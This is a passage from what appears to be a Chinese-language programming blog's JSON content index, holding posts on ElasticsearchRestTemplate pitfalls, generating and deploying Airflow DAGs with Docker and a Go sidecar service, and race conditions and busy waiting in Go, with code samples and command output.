相关注解，例如有一个字段（batchId）：\n1 2 @Field(type = FieldType.Keyword) private String batchId; 这种情况下，自动创建的 my_index-* 的 Mapping 所包含的 batchId 类型是 Text，而不是预期的 Keyword。一般来说，在保存实体之前，先检测当前月份的索引是否存在，若不存在，则创建索引（包括 Mapping），否则直接保存实体。\n1 2 3 4 5 6 7 8 9 void createIndexAndPutMapping(Class\u0026lt;T\u0026gt; entityClass) { IndexOperations ops = elasticsearchRestTemplate.indexOps(entityClass); if (ops.exists()) { return; } ops.create(); Document mapping = ops.createMapping(entityClass); ops.putMapping(mapping); } 上面的 createIndexAndPutMapping 线程不安全，多线程并发执行该方法时，不仅可能会看到下面的错误信息，而且 my_index-* 的 Mapping 也可能不符合预期。\n1 mapper [batchId] of different type, current_type [text], merged_type [keyword] 既希望各个线程保存实体互不干扰，又不希望同步机制所引起的延迟，那么最好的方案是使用索引模板。\n1 2 3 4 5 6 7 8 boolean putTemplate(Class\u0026lt;T\u0026gt; entityClass, String templateName, String... indexPatterns) { IndexOperations ops = elasticsearchRestTemplate.indexOps(entityClass); PutTemplateRequest request = PutTemplateRequest.builder(templateName, indexPatterns) .withSettings(Document.from(ops.createSettings())) .withMappings(Document.from(ops.createMapping())) .build(); return ops.putTemplate(request); } 构建模板时，指定索引的模式（indexPatterns），这里就是 my_index-*，之后所有名称满足该模式的索引创建时，它们的 Mapping 完全一致。注意，以上方法无需同步机制，但是要求单线程执行，例如在程序启动时由单线程执行 createIndexAndMapping 方法，再由多线程执行 ElasticsearchRestTemplate 的 save 方法。\n实体内容太长 在日志中看到了这样的错误信息：\n1 entity content is too long [499093206] for the configured buffer limit [104857600] 从 HttpAsyncResponseConsumerFactory 可以知道 Elasticsearch 客户端接收响应的缓冲区大小是 100 MB（104857600 bytes），虽然是硬编码，但是已经足够大到覆盖绝大多数场景，不如调查一下是否是业务逻辑代码的缺陷。\n有可能是因为先过滤后聚合的查询没有限制记录条数，可以考虑设置 withPageable。\n1 2 3 4 5 6 NativeSearchQuery query = new NativeSearchQueryBuilder() .withQuery(queryBuilder) .withPageable(PageRequest.of(0, 1)) .addAggregation(aggregationBuilder) .withIndicesOptions(IndicesOptions.lenientExpandOpen()) .build(); 分组和排序以及 Top-N 例如，一个先过滤后聚合的查询：\n按某一字段过滤。 按某一字段分组。 组内按某一字段排序。 每组只取前几个。 各组按某一字段排序。 Query DSL 如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 { \u0026#34;query\u0026#34;: { \u0026#34;bool\u0026#34;: { \u0026#34;must\u0026#34;: [ { \u0026#34;term\u0026#34;: { \u0026#34;eventId\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;AXso-TZMPxhCtoMLAWoN\u0026#34;, \u0026#34;boost\u0026#34;: 1.0 } } } ], \u0026#34;adjust_pure_negative\u0026#34;: true, \u0026#34;boost\u0026#34;: 1.0 } }, \u0026#34;aggs\u0026#34;: { \u0026#34;group-by-batchId\u0026#34;: { \u0026#34;terms\u0026#34;: { \u0026#34;field\u0026#34;: \u0026#34;batchId\u0026#34;, \u0026#34;size\u0026#34;: 10, \u0026#34;min_doc_count\u0026#34;: 1, \u0026#34;shard_min_doc_count\u0026#34;: 0, \u0026#34;show_term_doc_count_error\u0026#34;: false, \u0026#34;order\u0026#34;: [ { \u0026#34;min-createTime\u0026#34;: \u0026#34;asc\u0026#34; }, { \u0026#34;_key\u0026#34;: \u0026#34;asc\u0026#34; } ] }, \u0026#34;aggregations\u0026#34;: { \u0026#34;min-createTime\u0026#34;: { \u0026#34;min\u0026#34;: { \u0026#34;field\u0026#34;: \u0026#34;createTime\u0026#34; } }, \u0026#34;topN\u0026#34;: { \u0026#34;top_hits\u0026#34;: { \u0026#34;from\u0026#34;: 0, \u0026#34;size\u0026#34;: 1, \u0026#34;version\u0026#34;: false, \u0026#34;seq_no_primary_term\u0026#34;: false, \u0026#34;explain\u0026#34;: false, \u0026#34;sort\u0026#34;: [ { \u0026#34;actionStartTime\u0026#34;: { \u0026#34;order\u0026#34;: \u0026#34;asc\u0026#34; } } ] } } } } } } 这里关键在于分组之后，在每一组求用于各组排序的字段的最小值或最大值。\n1 2 3 4 5 MinAggregationBuilder minAggBuilder = AggregationBuilders .min(minAggName) .field(orderByField); termsAggBuilder.order(BucketOrder.aggregation(minAggName, orderByFieldAsc)); termsAggBuilder.subAggregation(minAggBuilder); 字段膨胀 Elasticsearch 限制客户端将过多键值对插入索引。\n1 2 3 4 /** * nodeId to taskId */ private Map\u0026lt;String, String\u0026gt; nodeId2TaskId; 上面是 Object 或者 Nested 的字段，随着插入次数增多，可能遇到异常：\n1 Limit of total fields [1000] in index has been exceeded 如果不需要检索，那么优先考虑将字段类型设置为 Flattened。\n1 2 @Field(type = FieldType.Flattened) private Map\u0026lt;String, String\u0026gt; nodeId2TaskId; 本文首发于 https://h2cone.github.io\n参考资料 Spring Data Elasticsearch # High Level REST Client\nSpring Data Elasticsearch - Reference Documentation\nAnd the big one said \u0026ldquo;Rollover\u0026rdquo; — Managing Elasticsearch time-based indices efficiently\nElasticsearch Guide # Aggregations\n","date":"2021-07-26T11:05:02+08:00","permalink":"https://h2cone.github.io/2021/07/26/elasticsearch_rest_template_pitfall/","title":"ElasticsearchRestTemplate 的一些坑"},{"content":"背景 近期，从零开始搭建 SOAR 平台，其中工作流引擎或任务编排组件是核心组件之一。\nAirflow Airflow 是用于描述、执行、监控工作流的平台。目前为止，启动 Airflow 最快的方式是——在 Docker 中运行 Airflow，这种安装方式也有利于可扩展性。\n有一些组件需要说明一下（此处省略 Flower）：\nWebserver：提供访问 DAG、任务、变量、连接等等的状态信息的 Airflow REST API。 Scheduler：负责 DAG 解析与任务调度。 Worker：执行由 Scheduler 分配的任务。 Redis：Scheduler 与 Worker 之间的消息代理。 Postgres：存储有关 DAG、任务、变量、连接等等的状态信息。 上述组件是进程级组件，需要注意的是 DAGs 并不是进程，而是指多个 Python 源文件。DAG 是有向无环图（Directed Acyclic Graph）的缩写，从 Airflow 的角度来看，DAG 用于描述工作流，有向无环图中的结点被称为任务（Task），而 Task 是通过 Operator 来实现。DAGs 的位置在 Airflow 配置文件中指定，重要的事情是 Webserver 和 Scheduler 以及 Worker 都需要读取 DAGs。\n生成 DAG 编写 DAG 需要一定的 Python 知识，甚至 Airflow 并不提供创建 DAG 的 UI 或 REST API。情理之中，Airflow 创建工作流并不包含“无代码”或“低代码”特性，从官方首页可以看到其定位：\nAirflow is a platform created by the community to programmatically author, schedule and monitor workflows.\n后端满足可视化任务编排需求解决方案之一是通过用户输入生成 DAG 源文件，即生成特定的 Python 源文件。\n模板方法 体验过编写 DAG 或浏览过 DAG 示例之后可以归纳出 DAG 的一般结构：\nImport Statements（导入语句）\nDefault Arguments（默认参数）\nDAG Constructor（DAG 构造器）\nOperators（Operator 构造器）\nDependencies（Operator 之间的依赖关系）\n如果需要一些复杂函数才能满足需求，完全可以将复杂度转移到 Airflow 之外的服务提供者（service provider），例如在 DAG 中使用 HTTP Operators 向服务提供者发送请求，由服务提供者处理请求（具体业务逻辑在服务提供者实现）。\n程序可以根据 DAG 的一般结构，依次追加代码片段。根据关注点分离原则，类似于模型（Model）与视图（View）的分离降低了复杂度，代码片段可分为静态内容和动态内容，前者通常是是样板代码，后者通常是参数值；将静态内容与动态内容合成源代码最便利的工具是模板引擎，而不是重新发明轮子。\n各种编程语言早已有面向 Web 领域的模板引擎，但此处并不需要基于文档树（DOM）生成，因为期望输出不是 HTML 之类的文件，而是 Python 源文件，即纯文本，因而考虑基于字符串的模板引擎，例如 Antlr Project 下的 StringTemplate 4，此介绍非常有助于理解 StringTemplate 4。\n1 2 3 4 5 6 7 8 9 public class User { public int id; // template can directly access via u.id private String name; // template can\u0026#39;t access this public User(int id, String name) { this.id = id; this.name = name; } public boolean isManager() { return true; } // u.manager public boolean hasParkingSpot() { return true; } // u.parkingSpot public String getName() { return name; } // u.name public String toString() { return id+\u0026#34;:\u0026#34;+name; } // u } 1 2 3 ST st = new ST(\u0026#34;\u0026lt;b\u0026gt;$u.id$\u0026lt;/b\u0026gt;: $u.name$\u0026#34;, \u0026#39;$\u0026#39;, \u0026#39;$\u0026#39;); st.add(\u0026#34;u\u0026#34;, new User(999, \u0026#34;parrt\u0026#34;)); String result = st.render(); // \u0026#34;\u0026lt;b\u0026gt;999\u0026lt;/b\u0026gt;: parrt\u0026#34; 如何使用 StringTemplate 4 的模板表达式编写 DAG 模板？不妨参考 airflow-up/templates。此处列举一例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;t.taskId\u0026gt; = SimpleHttpOperator( task_id=\u0026#39;\u0026lt;t.taskId\u0026gt;\u0026#39;, http_conn_id=\u0026#39;\u0026lt;t.httpConnId\u0026gt;\u0026#39;, endpoint=\u0026#39;\u0026lt;t.endpoint\u0026gt;\u0026#39;, method=\u0026#39;\u0026lt;t.method\u0026gt;\u0026#39;, \u0026lt;if(t.data)\u0026gt;data=\u0026#34;{{ dag_run.conf[\u0026#39;\u0026lt;t.taskId\u0026gt;\u0026#39;][\u0026#39;data\u0026#39;] \u0026lt;if(t.dataFilter)\u0026gt;\u0026lt;t.dataFilter\u0026gt;\u0026lt;endif\u0026gt; }}\u0026#34;,\u0026lt;endif\u0026gt; \u0026lt;if(t.headers)\u0026gt;headers=\u0026lt;t.headers\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(t.responseCheck)\u0026gt;response_check=\u0026lt;t.responseCheck\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(t.responseFilter)\u0026gt;response_filter=\u0026lt;t.responseFilter\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(t.extraOptions)\u0026gt;extra_options=\u0026lt;t.extraOptions\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(logResponse)\u0026gt;log_response=\u0026lt;logResponse\u0026gt;,\u0026lt;endif\u0026gt; dag=dag, ) DAG 源文件甚至可以包含 Jinja 表达式（dataFilter 的值选自 Jinja2 内置过滤器，在触发 DAG 运行时，Airflow 渲染 DAG 源文件，并且传递额外配置参数（dag_run.conf）的值。之所以使用 Jinja2，除了 Airflow 天然支持以外，原因之一是业务系统将事件作为请求参数的一部分（额外配置参数）传递给 Webserver 用于触发一个新的 DAG 运行的接口（POST /dags/{dag_id}/dagRuns），因此有些参数没法在生成 DAG 源文件时确定，而只能在运行时确定。\nNote: The parameters from dag_run.conf can only be used in a template field of an operator.\n原因之二是 SimpleHttpOperator 或 HttpSensor 的构造器对于不同的请求方法（method）要求不同结构的请求参数（data），例如 POST 请求参数要求 JSON，而 GET 请求参数要求 Query String。\nAirflow 官方推荐使用移位运算符定义 Operator 之间的依赖关系。用户提交到后端的流程图（通常是树或有向无环图）定义了结点之间的依赖关系，生成 Operator 之间的依赖关系最直截了当的方式是使用深度搜索列出所有路径。\n每个栈帧都维护一个有序列表（子路径），方法执行过程将结点或 Operator 添加到子路径，递归调用时将子路径元素存入新子路径，循环结束后将子路径添加到主路径。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 void addPathToPaths(List\u0026lt;Node\u0026gt; nodes, List\u0026lt;Node\u0026gt; path) { if (CollectionUtils.isEmpty(nodes)) { return; } for (Node node : nodes) { if (Objects.isNull(node)) { continue; } addNodeToPath(node); List\u0026lt;Node\u0026gt; children = node.getChildren(); if (CollectionUtils.isNotEmpty(children)) { addPathToPaths(children, new ArrayList\u0026lt;\u0026gt;(path)); } } if (CollectionUtils.isNotEmpty(path)) { paths.add(path); } } DAG 代理 Airflow 的 Scheduler 定期扫描 DAG 目录，发现新 DAG 文件，同时定期解析该目录下的每一个 DAG 文件，两者的频率可通过 min_file_process_interval 和 dag_dir_list_interval 设置。应用程序是否也必须知道该目录的绝对路径？应用程序必须与 Airflow 运行在同一台服务器上？显然不是，只需要在应用程序与 DAGs 之间插入一个中间层。\n共享卷 假如在 Docker 中运行 Airflow，方便开发运维起见，DagAgent 理应在 Docker 中运行，但是 DagAgent 接收到 DAG 文件后应该写到哪里去？以 airflow/docker-compose.yaml 为例，创建了三个卷（Volume）：\n1 2 3 4 5 6 7 8 9 version: \u0026#39;3\u0026#39; x-airflow-common: ... volumes: - ./dags:/opt/airflow/dags - ./logs:/opt/airflow/logs - ./plugins:/opt/airflow/plugins ... ... 其中 DAG 目录的源地址是 ./dags（宿主机视角），而目的地是 /opt/airflow/dags（Docker 容器视角）；可喜可贺的是 Docker CLI 已经支持 Compose 命令，捣鼓 Docker 版 Airflow 也就不需要 docker-compose ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 % docker compose up -d [+] Running 8/8 ⠿ Network \u0026#34;airflow_default\u0026#34; Created 0.6s ⠿ Container airflow_redis_1 Started 1.6s ⠿ Container airflow_postgres_1 Started 1.4s ⠿ Container airflow_airflow-scheduler_1 Started 10.0s ⠿ Container airflow_airflow-init_1 Started 10.3s ⠿ Container airflow_airflow-worker_1 Started 10.5s ⠿ Container airflow_airflow-webserver_1 Started 7.8s ⠿ Container airflow_dagagent_1 Started 10.6s % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 122a8455e781 dagagent:latest \u0026#34;./dagagent\u0026#34; 16 minutes ago Up 16 minutes (healthy) 0.0.0.0:1323-\u0026gt;1323/tcp airflow_dagagent_1 8ab76a88a05a apache/airflow:2.0.2 \u0026#34;/usr/bin/dumb-init …\u0026#34; 16 minutes ago Up 16 minutes (healthy) 0.0.0.0:8889-\u0026gt;8080/tcp airflow_airflow-webserver_1 1d0e1b191ea0 apache/airflow:2.0.2 \u0026#34;/usr/bin/dumb-init …\u0026#34; 16 minutes ago Up 16 minutes 8080/tcp airflow_airflow-scheduler_1 a389b993a2c3 apache/airflow:2.0.2 \u0026#34;/usr/bin/dumb-init …\u0026#34; 16 minutes ago Up 16 minutes 8080/tcp airflow_airflow-worker_1 12015f9bc778 postgres:13 \u0026#34;docker-entrypoint.s…\u0026#34; 16 minutes ago Up 16 minutes (healthy) 5432/tcp airflow_postgres_1 e32501a14963 redis:latest \u0026#34;docker-entrypoint.s…\u0026#34; 16 minutes ago Up 16 minutes (healthy) 0.0.0.0:6379-\u0026gt;6379/tcp airflow_redis_1 当前主目录如下：\n1 2 3 4 5 . ├── dags ├── logs ├── plugins └── docker-compose.yaml 在宿主机上将 DAG 文件输入到 dags，运行在 Docker 中的 Airflow 可感知；Airflow 的 Docker 容器输出的文件在宿主机可观测。由于 DagAgent 容器化，它的文件 I/O 自然作用于容器文件系统，因此从 DagAgent 的角度来看，DAG 目录也是 /opt/airflow/dags；既然 Webserver、Scheduler、Worker 都引用了 airflow-common，DagAgent 服务配置中可以使用 volumes_from 共享 DAG 目录：\n1 2 3 4 5 6 7 8 9 10 11 12 ... dagagent: image: dagagent:latest ports: - 1323:1323 environment: AIRFLOW__CORE__DAGS_FOLDER: /opt/airflow/dags ... volumes_from: - airflow-webserver:rw ... ... 最小化镜像 DagAgent 仅仅是一个微小的服务，容器化 Java 程序的话通常过于重量级，不妨使用 Go 编写，详情可参考 dagagent。\n基于 Go 官方镜像构建应用程序镜像，直接了当的 Dockerfile 文件：\n1 2 3 4 5 6 7 8 9 FROM golang:1.16 WORKDIR /go/src/github.com/h2cone/dagagent COPY . . RUN go get -d -v ./... RUN go install -v ./... CMD [\u0026#34;dagagent\u0026#34;] 构建名为 dagagent:straightforward 的镜像：\n1 % docker build -t dagagent:straightforward -f docker/Dockerfile-straightforward . 但是 dagagent:straightforward 实在是太大了！\n1 2 3 4 5 6 % docker image list REPOSITORY TAG IMAGE ID CREATED SIZE dagagent straightforward 149604a01e75 6 seconds ago 1.05GB redis latest 739b59b96069 2 weeks ago 105MB apache/airflow 2.0.2 d7a0ff8c98a9 2 weeks ago 871MB postgres 13 26c8bcd8b719 3 weeks ago 314MB 基础镜像是罪魁祸首？使用 golang:1.16-alpine 代替 golang:1.16：\n1 2 3 4 5 6 7 8 9 FROM golang:1.16-alpine WORKDIR /go/src/github.com/h2cone/dagagent COPY . . RUN go get -d -v RUN go install -v CMD [\u0026#34;dagagent\u0026#34;] 构建名为 dagagent:small 的镜像：\n1 % docker build -t dagagent:small -f docker/Dockerfile-small . 该镜像大小已经小于 1G，是否还能再精简？\n1 2 3 4 5 6 7 % docker image list REPOSITORY TAG IMAGE ID CREATED SIZE dagagent small 145b612b635e 5 seconds ago 485MB dagagent straightforward 149604a01e75 About a minute ago 1.05GB redis latest 739b59b96069 2 weeks ago 105MB apache/airflow 2.0.2 d7a0ff8c98a9 2 weeks ago 871MB postgres 13 26c8bcd8b719 3 weeks ago 314MB 分析一下以上两个镜像的组成，至少包含下载的依赖文件、应用程序的源文件、静态编译输出的可执行文件等。DagAgent 运行时只需要可执行文件与操作系统，故使用多阶段构建（multi-stage builds），将编译时与运行时分为两个阶段，运行时所需的可执行文件拷贝自编译时，最终只产出包含可执行文件与操作系统的镜像：\n1 2 3 4 5 6 7 8 9 10 11 12 FROM golang:1.16-alpine3.12 AS builder WORKDIR /go/src/github.com/h2cone/dagagent COPY . . RUN go build -v FROM alpine:3.12 WORKDIR /root COPY --from=builder /go/src/github.com/h2cone/dagagent/dagagent . CMD [\u0026#34;./dagagent\u0026#34;] 构建名为 dagagent:min 的镜像：\n1 % docker build -t dagagent:min -f docker/Dockerfile-min . 该镜像大小已降低 94%：\n1 2 3 4 5 6 7 8 % docker image list REPOSITORY TAG IMAGE ID CREATED SIZE dagagent min 75dbfbb53d78 10 seconds ago 27.3MB dagagent small 145b612b635e 4 minutes ago 485MB dagagent straightforward 149604a01e75 5 minutes ago 1.05GB redis latest 739b59b96069 2 weeks ago 105MB apache/airflow 2.0.2 d7a0ff8c98a9 2 weeks ago 871MB postgres 13 26c8bcd8b719 3 weeks ago 314MB 加速构建 回头看 dagagent:straightforward，除了镜像过大，还有一个缺点，即下载依赖时（通常最耗时）无法命中缓存。只更新了 DagAgent 的源代码但不更新依赖，构建镜像时却需重新下载依赖。\n加速镜像构建首要方式是充分利用构建缓存（Leverage build cache）。Docker 镜像建立在一系列层之上，每一层表示 Dockerfile 中的一条指令的执行结果。假如不禁用缓存，Docker 执行每一条 Dockerfile 指令时先查找之前层的缓存，若命中（例如校验和相等），则不重新执行当前指令而是引用已存在的层。一般情况下，结果不易变的指令写在结果易变的指令之前的 Dockerfile 缓存利用率更高。\nDagAgent 源代码比依赖更易变，根据上文，先下载依赖后拷贝源代码：\n1 2 3 4 5 6 7 8 9 10 11 12 FROM golang:1.16 WORKDIR /go/src/github.com/h2cone/dagagent COPY go.mod . COPY go.sum . RUN go mod download -x COPY . . RUN go install -v CMD [\u0026#34;dagagent\u0026#34;] 结合上一节的“最小化镜像”，最终版本的 Dockerfile 如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # syntax=docker/dockerfile:1 FROM golang:1.16-alpine3.12 AS builder ENV GOPROXY=\u0026#34;https://goproxy.io,direct\u0026#34; WORKDIR /go/src/github.com/h2cone/dagagent COPY go.mod . COPY go.sum . RUN go mod download -x COPY . . RUN go build -v FROM alpine:3.12 RUN apk add curl WORKDIR /root COPY --from=builder /go/src/github.com/h2cone/dagagent/dagagent . CMD [\u0026#34;./dagagent\u0026#34;] 构建名为 dagagent:latest 的镜像:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 % docker build -t dagagent -f docker/Dockerfile . [+] Building 36.5s (19/19) FINISHED =\u0026gt; [internal] load build definition from Dockerfile 0.0s =\u0026gt; =\u0026gt; transferring dockerfile: 37B 0.0s =\u0026gt; [internal] load .dockerignore 0.0s =\u0026gt; =\u0026gt; transferring context: 2B 0.0s =\u0026gt; resolve image config for docker.io/docker/dockerfile:1 19.2s =\u0026gt; CACHED docker-image://docker.io/docker/dockerfile:1@sha256:e2a8561e419ab1ba6b2fe6cbdf49fd92b95912df1cf7d313c3e2230a333fdbcc 0.0s =\u0026gt; [internal] load metadata for docker.io/library/alpine:3.12 7.6s =\u0026gt; [internal] load metadata for docker.io/library/golang:1.16-alpine3.12 17.1s =\u0026gt; [builder 1/7] FROM docker.io/library/golang:1.16-alpine3.12@sha256:1636899c10870ab66c48d960a9df620f4f9e86a0c72fbacf36032d27404e7e6c 0.0s =\u0026gt; =\u0026gt; resolve docker.io/library/golang:1.16-alpine3.12@sha256:1636899c10870ab66c48d960a9df620f4f9e86a0c72fbacf36032d27404e7e6c 0.0s =\u0026gt; [stage-1 1/4] FROM docker.io/library/alpine:3.12@sha256:36553b10a4947067b9fbb7d532951066293a68eae893beba1d9235f7d11a20ad 0.0s =\u0026gt; [internal] load build context 0.0s =\u0026gt; =\u0026gt; transferring context: 6.42kB 0.0s =\u0026gt; CACHED [stage-1 2/4] RUN apk add curl 0.0s =\u0026gt; CACHED [stage-1 3/4] WORKDIR /root 0.0s =\u0026gt; CACHED [builder 2/7] WORKDIR /go/src/github.com/h2cone/dagagent 0.0s =\u0026gt; CACHED [builder 3/7] COPY go.mod . 0.0s =\u0026gt; CACHED [builder 4/7] COPY go.sum . 0.0s =\u0026gt; CACHED [builder 5/7] RUN go mod download -x 0.0s =\u0026gt; CACHED [builder 6/7] COPY . . 0.0s =\u0026gt; CACHED [builder 7/7] RUN go build -v 0.0s =\u0026gt; CACHED [stage-1 4/4] COPY --from=builder /go/src/github.com/h2cone/dagagent/dagagent . 0.0s =\u0026gt; exporting to image 0.0s =\u0026gt; =\u0026gt; exporting layers 0.0s =\u0026gt; =\u0026gt; writing image sha256:ad807e3e1bda89824e55db14088156f9d4e8dabce6d4e79af117eb533371e4dc 0.0s =\u0026gt; =\u0026gt; naming to docker.io/library/dagagent 0.0s 判断指令是否命中缓存可通过一个关键词——CACHED来判断。\n插件发现 当 Airflow 生态的现有的 Operators 不满足需求时，可以考虑自定义 Operator，例如要实现一个哨兵语句式的 HTTP Operator，又如要实现一个可以将额外配置参数或上游 Tasks 的返回值（传递机制是 XComs）组装成复杂请求参数的拓展 HTTP Operator。\n1 2 3 4 5 6 7 8 9 10 . ├── dags ├── logs ├── plugins │ └── operators │ ├── __init__.py │ ├── extended_http_operator.py │ ├── extended_http_sentinel.py │ └── simple_http_sentinel.py ├── docker-compose.yaml 实现了新的 Operator 之后，当前版本的 Airflow 能够发现类似上面 plugins/operators 目录下的自定义 Operator，技巧在于内容空白的 __init__.py，自定义 Operator 的导入语句如下：\n1 2 3 from operators.simple_http_sentinel import SimpleHttpSentinel from operators.extended_http_sentinel import ExtendedHttpSentinel from operators.extended_http_operator import ExtendedHttpOperator 状态同步 业务系统很可能需要知道一个 DAG 运行后的状态（成功或失败），DAG 构造器有成功/失败的回调函数类型的参数（on_success_callback/on_failure_callback），美中不足的是没有表示失败重试次数的参数，然而受到 Python Requests 的高级使用 - 超时，重试，钩子的启发，于是编写了 dag_callback 来提高回调更新状态的成功率。\n数据库代理 按照 Fine-tuning your Scheduler performance 调优 Airflow Scheduler 时，注意到下面这段话：\nDatabase connections and Database usage might become a problem as you want to increase performance and process more things in parallel. Airflow is known from being “database-connection hungry” - the more DAGs you have and the more you want to process in parallel, the more database connections will be opened. This is generally not a problem for MySQL as its model of handling connections is thread-based, but this might be a problem for Postgres, where connection handling is process-based. It is a general consensus that if you have even medium size Postgres-based Airflow installation, the best solution is to use PGBouncer as a proxy to your database. The Helm Chart for Apache Airflow supports PGBouncer out-of-the-box. For MsSQL we have not yet worked out the best practices as support for MsSQL is still experimental.\n在我的测试中，部署了edoburu/docker-pgbouncer 后，Airflow 任务实例之间的延迟下降了 20% ~ 30%。\nDeferrable Operators 如果长时间运行的 Sensors 资源开销不容小觑（基于多进程模型），疑似拖慢其它 Operator，那么不妨考虑 Smart Sensors 或者 Deferrable Operators，后者提供了一种更灵活的方式来实现高效的长时间运行的 Sensor。\n尾声 更多编排引擎（orchestration engine）：\nCadence\nTemporal\n本文首发于 https://h2cone.github.io\n参考资料 Airflow # Concepts\nAirflow # Celery Executor\nAirflow # Configuration Reference\nAirflow # Ecosystem\nCurated list of resources about Apache Airflow\nDevelop with Docker\n","date":"2021-05-01T18:12:03+08:00","permalink":"https://h2cone.github.io/2021/05/01/airflow_trick/","title":"Airflow 杂技"},{"content":"反面 上课期间看到一段模拟投票的程序，其中主协程（main goroutine）产生的若干子协程并发请求票与计票，主协程重复检查票数是否已达到预期。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) func main() { rand.Seed(time.Now().UnixNano()) total, err := strconv.Atoi(os.Args[1]) if err != nil { panic(err) } overHalf := total/2 + 1 count := 0 finished := 0 var mu sync.Mutex for i := 0; i \u0026lt; total; i++ { go func() { vote := requestVote() mu.Lock() defer mu.Unlock() if vote { count++ } finished++ }() } for count \u0026lt; overHalf \u0026amp;\u0026amp; finished \u0026lt; total { // ... } fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;finished: %d\\n\u0026#34;, finished) fmt.Printf(\u0026#34;count \u0026gt;= overHalf: %t\\n\u0026#34;, count \u0026gt;= overHalf) } func requestVote() bool { time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond) return rand.Int()%2 == 0 } 由于若干子协程并发访问一些共享变量（count 和 finished），使用互斥锁（Mutex）可直截了当防止内存一致性错误。另一方面，主协程反复检查票数时对于 count 和 finished 只读，因此并不需要锁定与解锁？\n1 2 3 for count \u0026lt; overHalf \u0026amp;\u0026amp; finished \u0026lt; total { // ... } Visual Studio Code 推荐的 Go 代码静态分析器—— go-staticcheck 对以上循环语句给出了以下提示：\nloop condition never changes or has a race condition (SA5002) go-staticcheck\n竞态条件（race condition）是指事件的时序或次序的不确定性影响到程序的正确性时产生的缺陷。此处不确定性的典型事例是上下文切换、操作系统信号、多处理器上的内存操作、硬件中断等，一般来说，产生竞态条件的场景是并发。在模拟投票程序，主协程读共享变量与若干子协程写共享变量这两件事的次序具有不确定性（参见多线程·并发编程），但是该程序结果仍然符合预期，因为这些共享变量从主协程的角度来看只是只读的变量（仅判断条件为真后不做任何事情而是继续判断条件）；尽管主协程某时刻可能读到脏数据（脏读），但是在这之后总能读到最终值，因为 count/finished 的值只递增，而且 overHalf/total 的值不变。如果主协程对共享变量不仅读取而且写入，出于安全考虑应当使用同步（Synchronization），例如也使用互斥锁：\n1 2 3 4 5 6 7 8 9 10 11 for { mu.Lock() if count \u0026gt;= overHalf || finished \u0026gt;= total { break } mu.Unlock() } fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;finished: %d\\n\u0026#34;, finished) fmt.Printf(\u0026#34;count \u0026gt;= overHalf: %t\\n\u0026#34;, count \u0026gt;= overHalf) mu.Unlock() 不仅消灭了潜在的竞态条件，而且消灭了潜在的数据竞争（data race）。数据竞争发生在两个线程/协程并发访问相同变量并且至少一个访问是写入时。发生数据竞争的三个条件：\n两个或多个线程/协程并发访问相同的变量。\n至少有一个访问是写入。\n没有同步访问机制。\n下面老套的程序（主协程将等待所有子协程完成计数任务后才汇报）比较容易捕获协程之间的数据竞争产生的 BUG。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;sync\u0026#34; ) func main() { total, err := strconv.Atoi(os.Args[1]) if err != nil { panic(err) } count := 0 var wg sync.WaitGroup for i := 0; i \u0026lt; total; i++ { wg.Add(1) go func() { defer wg.Done() count++ }() } wg.Wait() fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;count == total: %t\\n\u0026#34;, count == total) } Go 官方提供了 Data Race Detector 用于探测协程之间的数据竞争，有利于人们排除并发引起的故障。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 % go run -race count.go 1000000 ================== WARNING: DATA RACE Read at 0x00c0001ba008 by goroutine 8: main.main.func1() /Users/cosimo/vscws/go-examples/condvar/count.go:22 +0x6c Previous write at 0x00c0001ba008 by goroutine 7: main.main.func1() /Users/cosimo/vscws/go-examples/condvar/count.go:22 +0x84 Goroutine 8 (running) created at: main.main() /Users/cosimo/vscws/go-examples/condvar/count.go:20 +0x184 Goroutine 7 (finished) created at: main.main() /Users/cosimo/vscws/go-examples/condvar/count.go:20 +0x184 ================== count: 999990 count == total: false Found 1 data race(s) exit status 66 以上只是借题发挥，与忙等（busy waiting）并无关系，忙等有时被称为自旋（spinning）。模拟投票程序中的主协程反复判断条件是在浪费 CPU 时间，静态分析器得出了类似的警告：\nthis loop will spin, using 100%% CPU (SA5002) go-staticcheck\n在大多数情况下，忙等被认为是反模式而应该避免，与其将 CPU 时间浪费在无用的活动上，不如用于执行其它任务。\n1 2 3 while (\u0026lt;condition\u0026gt;) { Thread.sleep(millis); } 即使是在循环体内睡眠，IntelliJ IDEA 也可能提醒道：\nCall to \u0026lsquo;Thread.sleep()\u0026rsquo; in a loop, probably busy-waiting\n不过是五十步笑百步罢了。虽然调整睡眠时长能减少条件判断次数，但是反复唤醒的成本不容忽视，无法排除浪费 CPU 时间的嫌疑。\n条件变量 最少化线程/协程的 CPU 